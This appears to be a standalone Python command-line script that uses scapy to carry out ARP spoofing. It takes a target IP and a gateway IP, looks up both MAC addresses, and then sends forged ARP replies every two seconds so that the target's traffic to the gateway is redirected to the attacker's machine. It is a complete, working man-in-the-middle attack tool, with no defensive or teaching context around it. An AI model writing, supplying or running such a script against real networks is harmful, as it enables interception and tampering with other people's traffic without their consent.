from scapy.all import *
import optparse
import time

# Exit codes:
# 0 - OK
# 1 - bad args
# 2 - Unable to get gateway MAC
# 3 - Unable to get target MAC


def getMAC(ip):
    resp = sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), \
            retry=2, timeout=10, verbose=False)
    if resp[ARP].hwsrc:
        return resp[ARP].hwsrc
    return None


def arpSpoof(gwIP, gwMAC, tgtIP, tgtMAC):
    """
    On the ARP request:
    hwdst = Ethernet header destination (Who we want to trick)
    hwsrc = Ethernet header source (It's always us)
    pdst  = ARP Destination IP (Who we want to trick)
    psrc  = ARP Source IP (Who we want to become)
    """
    print("[*] Starting ARP spoofing [Ctrl-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=tgtIP, hwdst=tgtMAC, psrc=gwIP), \
                    verbose=False)
            time.sleep(2)


    except KeyboardInterrupt:
        print("\n[*] Stopped.")

def main():
    parser = optparse.OptionParser("Usage %prog " + \
            "-t <target IP -g <gateway IP")

    parser.add_option('-t', dest='tgtIP', type='string', \
            help='specify target IP')
    parser.add_option('-g', dest='gwIP', type='string', \
            help='specify gateway IP')

    (options, args) = parser.parse_args()

    if (options.tgtIP == None) or (options.gwIP == None):
        print(parser.usage)
        exit(1)
    else:
        tgtIP = options.tgtIP
        gwIP  = options.gwIP

    gwMAC = getMAC(gwIP)
    if gwMAC == None:
        print("[!] Unable to get gateway MAC.")
        exit(2)

    tgtMAC = getMAC(tgtIP)
    if tgtMAC == None:
        print("[!] Unable to get target MAC.")
        exit(3)

    print("[*] Starting ARP spoofing...\n")
    print("[+] Gateway address: " + gwIP)
    print("[+] Gateway MAC: " + gwMAC + "\n")
    print("[+] Target address: " + tgtIP)
    print("[+] Target MAC: " + tgtMAC)

    arpSpoof(gwIP, gwMAC, tgtIP, tgtMAC)


if __name__ == '__main__':
    main()
